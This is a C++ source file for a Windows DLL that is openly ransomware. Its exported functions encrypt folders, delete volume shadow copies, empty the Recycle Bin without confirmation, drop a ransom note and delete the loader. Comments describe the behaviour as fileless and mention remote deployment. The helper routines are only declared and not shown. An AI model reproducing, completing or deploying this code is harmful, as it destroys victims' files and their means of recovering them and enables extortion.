


#include <windows.h>
#include <string>
#include "config.h"
#include "Base64.h"
#include "data_wipe.h"
#include "io_control.h"

// DLL export macro
#ifdef BUILD_DLL
#define DLL_EXPORT extern "C" __declspec(dllexport)
#else
#define DLL_EXPORT extern "C" __declspec(dllimport)
#endif

// Forward declarations
void getUserNote(std::wstring& note);
void SearchFolder(const std::wstring& folderPath);
void SelfDelete2();
void removeShadows();
void DoIOCP(LPWSTR* lpwParams, int paramsCount);
bool isCpuAesSupports();

// Globals
std::wstring wNoteString;

// Optional DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// Encrypt and wipe function - Fileless behavior
DLL_EXPORT void EncryptFolder(const wchar_t* folderPath) {
    if (!folderPath || !*folderPath) return;

    if (FAILED(CoInitialize(NULL))) return;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);

    getUserNote(wNoteString);

    // Shadow removal, recycle bin purge, token downgrade
#ifndef _DEBUG
    removeShadows();
    SHEmptyRecycleBinA(nullptr, nullptr, SHERB_NOCONFIRMATION);
#endif

    std::wstring wpath(folderPath);
    SearchFolder(wpath);

    CoUninitialize();
}

// Manual trigger for IOCP + remote deploy config
DLL_EXPORT void StartIOCPScan() {
    if (FAILED(CoInitialize(NULL))) return;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);

    getUserNote(wNoteString);

    LPWSTR dummyParams[] = { (LPWSTR)L"dllentry", nullptr };
    DoIOCP(dummyParams, 1);

    CoUninitialize();
}

// Expose shadow wipe manually
DLL_EXPORT void WipeVolumeShadows() {
    if (FAILED(CoInitialize(NULL))) return;
    removeShadows();
    CoUninitialize();
}

// Optional manual note dropper (for decoy or ransom note fileless drop)
DLL_EXPORT void DropNoteInFolder(const wchar_t* folderPath) {
    if (!folderPath || !*folderPath) return;
    std::wstring notePath = std::wstring(folderPath) + L"\\" + LOCKED_NOTE;
    getUserNote(wNoteString);

    DWORD dwWritten;
    HANDLE hFile = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, wNoteString.c_str(), (DWORD)(wNoteString.length() * sizeof(wchar_t)), &dwWritten, nullptr);
        CloseHandle(hFile);
    }
}

// Self-delete the DLL loader process if needed
DLL_EXPORT void SelfDelete() {
    SelfDelete2();
}
